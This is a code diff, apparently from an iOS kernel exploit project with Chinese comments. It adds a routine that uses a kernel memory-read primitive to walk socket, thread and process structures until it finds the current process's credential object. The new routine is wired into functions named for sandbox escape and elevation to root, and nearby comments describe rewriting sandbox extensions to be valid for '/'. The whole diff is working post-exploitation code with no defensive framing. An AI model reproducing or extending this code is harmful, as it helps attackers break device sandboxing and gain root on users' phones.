@@ -481,6 +481,142 @@ static uint64_t ds_discover_identities_v2(void)
     return 0;
 }
 
+#pragma mark - 身份发现 v3（零风险：只比较，不猜）
+
+/// 内核堆区间（zone）。内核静态段是 0xfffffff0…，两者不重叠。
+static inline bool ds_is_heap_pointer(uint64_t address)
+{
+    return address >= 0xffffffe000000000ULL && address < 0xfffffff000000000ULL;
+}
+
+/// 收集几个「确定是 socket」的对象地址：
+///   rw/control pcb + 0x40，再顺着 pcb 链表（pcb+0x20）多走两跳。
+/// 只做对象内的读，不猜地址。
+static int ds_collect_sockets(uint64_t *out, int maxCount)
+{
+    int count = 0;
+    uint64_t seeds[3];
+    int seedCount = 0;
+
+    if (ds_is_kaddr(g_ctx.rw_socket_pcb)) seeds[seedCount++] = g_ctx.rw_socket_pcb;
+    if (ds_is_kaddr(g_ctx.control_socket_pcb) && g_ctx.control_socket_pcb != g_ctx.rw_socket_pcb) {
+        seeds[seedCount++] = g_ctx.control_socket_pcb;
+    }
+    // 顺着 inpcb 链再拿一个
+    if (ds_is_kaddr(g_ctx.rw_socket_pcb)) {
+        uint64_t next = ds_kread_safe(g_ctx.rw_socket_pcb + 0x20);
+        if (ds_is_kaddr(next) && next != g_ctx.rw_socket_pcb) seeds[seedCount < 3 ? seedCount++ : 0] = next;
+    }
+
+    for (int i = 0; i < seedCount && count < maxCount; i++) {
+        uint64_t sock = ds_kread_safe(seeds[i] + DS_OFF_INPCB_INP_SOCKET);
+        if (!ds_is_kaddr(sock)) continue;
+        bool duplicate = false;
+        for (int k = 0; k < count; k++) if (out[k] == sock) duplicate = true;
+        if (!duplicate) out[count++] = sock;
+    }
+    return count;
+}
+
+/// v3 策略（实测教训：暴力扫描会 panic，绝对不能对来路不明的指针解引用）：
+///   1) 同一进程创建的多个 socket，其 so_cred 指向**同一个** cred 对象
+///      → 先在两个 socket 里找「同一 offset 上相同的堆指针」，只解引用这几个；
+///   2) 解引用后用 cr_uid == getuid() 二次确认，确认了才继续；
+///   3) 确认不了就只转储、绝不写内核内存。
+static uint64_t ds_discover_identities_v3(void)
+{
+    if (gUcred) return gUcred;
+
+    uint64_t sockets[3] = { 0, 0, 0 };
+    int socketCount = ds_collect_sockets(sockets, 3);
+    ds_log("[逃逸] 收集到 %d 个 socket 对象：0x%llx 0x%llx 0x%llx", socketCount,
+           (unsigned long long)sockets[0], (unsigned long long)sockets[1], (unsigned long long)sockets[2]);
+    if (socketCount > 0) gSelfSocketObject = sockets[0];
+
+    const uint32_t myuid = getuid();
+
+    // 规则一：两个 socket 在同一 offset 指向同一个堆对象 → 极可能是 so_cred
+    if (socketCount >= 2) {
+        for (uint64_t off = 0; off < 0x1000; off += 8) {
+            uint64_t a = ds_kread_safe(sockets[0] + off);
+            if (!a) continue;
+            uint64_t b = ds_kread_safe(sockets[1] + off);
+            if (a != b) continue;
+
+            uint64_t cand = ds_normalize_ptr(a);
+            if (!ds_is_heap_pointer(cand)) continue;
+            if ((cand & 0xF) != 0) continue;   // zone 对象都是 16 字节对齐，先用这个把垃圾值滤掉
+
+            uint32_t uid = ds_kread32_safe(cand + DS_OFF_UCRED_POSIX);
+            if (uid != myuid) continue;
+
+            gUcred = cand;
+            ds_log("[逃逸] 命中（两 socket 一致 + cr_uid 校验）：socket+0x%llx → cred 0x%llx（uid=%u）",
+                   (unsigned long long)off, (unsigned long long)cand, uid);
+            return cand;
+        }
+        ds_log("[逃逸] 两个 socket 没有共同的堆指针能通过 cr_uid 校验");
+    }
+
+    // 规则二：只在堆指针里找、且必须 cr_uid 对得上（每个 offset 最多一次解引用，范围有界）
+    for (int s = 0; s < socketCount; s++) {
+        for (uint64_t off = 0; off < 0x800; off += 8) {
+            uint64_t raw = ds_kread_safe(sockets[s] + off);
+            if (!raw) continue;
+            uint64_t cand = ds_normalize_ptr(raw);
+            if (!ds_is_heap_pointer(cand)) continue;
+            if ((cand & 0xF) != 0) continue;   // 同上：只解引用 16 字节对齐的堆对象
+            if (ds_kread32_safe(cand + DS_OFF_UCRED_POSIX) != myuid) continue;
+
+            gUcred = cand;
+            ds_log("[逃逸] 命中（单 socket + cr_uid 校验）：socket%d+0x%llx → cred 0x%llx",
+                   s, (unsigned long long)off, (unsigned long long)cand);
+            return cand;
+        }
+    }
+
+    // 规则三：给「so_background_thread 会被填充」的机型留的路（本机是 0，会直接跳过）。
+    // 全程用 heap+对齐+p_pid 三重校验，确认 proc 之后才去 proc_ro 里按 cr_uid 找 cred。
+    if (socketCount >= 1 && ds_is_heap_pointer(sockets[0])) {
+        uint64_t thread = ds_kread_safe(sockets[0] + DS_OFF_SOCKET_BG_THREAD);
+        if (ds_is_heap_pointer(thread) && (thread & 0xF) == 0) {
+            for (uint64_t troOff = 0x300; troOff <= 0x4A0; troOff += 8) {
+                uint64_t tro = ds_kread_safe(thread + troOff);
+                if (!ds_is_heap_pointer(tro) || (tro & 0xF) != 0) continue;
+
+                uint64_t proc = ds_kread_safe(tro + DS_OFF_PROC_RO_TRO_PROC);
+                if (!ds_is_heap_pointer(proc) || (proc & 0xF) != 0) continue;
+                if ((pid_t)ds_kread32_safe(proc + DS_OFF_PROC_PID) != getpid()) continue;
+
+                uint64_t procRo = ds_kread_safe(proc + DS_OFF_PROC_RO);
+                for (uint64_t off = 0x10; off <= 0x40; off += 8) {
+                    uint64_t cand = ds_normalize_ptr(ds_kread_safe(procRo + off));
+                    if (!ds_is_heap_pointer(cand) || (cand & 0xF) != 0) continue;
+                    if (ds_kread32_safe(cand + DS_OFF_UCRED_POSIX) != myuid) continue;
+
+                    gThreadTroOffset = troOff;
+                    gSelfProc = proc;
+                    gUcred = cand;
+                    ds_log("[逃逸] 命中（socket→thread→proc→proc_ro + p_pid/cr_uid 校验）："
+                            "so_bg_thread@0x%llx thread_t_tro@0x%llx proc=0x%llx cred=0x%llx",
+                           (unsigned long long)DS_OFF_SOCKET_BG_THREAD, (unsigned long long)troOff,
+                           (unsigned long long)proc, (unsigned long long)cand);
+                    return cand;
+                }
+            }
+        }
+    }
+
+    // 都没命中：只转储（对象内读，安全），下一轮照实测数据修正
+    ds_log("[逃逸] 未能确认本进程 cred，转储关键对象（不做任何写操作）：");
+    ds_dump_words("rw_pcb", g_ctx.rw_socket_pcb, 0x20);
+    ds_dump_words("control_pcb", g_ctx.control_socket_pcb, 0x20);
+    if (ds_is_kaddr(sockets[0])) ds_dump_words("socket0", sockets[0], 0x80);
+    if (ds_is_kaddr(sockets[1]) && sockets[1] != sockets[0]) ds_dump_words("socket1", sockets[1], 0x80);
+    ds_log("[逃逸] 转储结束");
+    return 0;
+}
+
 #pragma mark - 改写沙盒扩展
 
 /// 把扩展数据里的路径改成 "/"，并把长度/哈希字段填成「永远有效」
@@ -533,7 +669,7 @@ static int ds_patch_chain(uint64_t header, const char *rwClass)
 
 static int DSEscapeSandboxInternal(void)
 {
-    uint64_t ucred = ds_discover_identities_v2();
+    uint64_t ucred = ds_discover_identities_v3();
     if (!ucred) return -2;
 
     uint64_t label = ds_kread_safe(ucred + gCredOff.labelOff);
@@ -622,7 +758,7 @@ int DSEscapeElevateToRoot(ds_escape_log_fn log)
         return 0;
     }
 
-    uint64_t ucred = ds_discover_identities_v2();
+    uint64_t ucred = ds_discover_identities_v3();
     if (!ucred) { gLog = NULL; return -2; }
 
     uint64_t posix = ucred + DS_OFF_UCRED_POSIX;
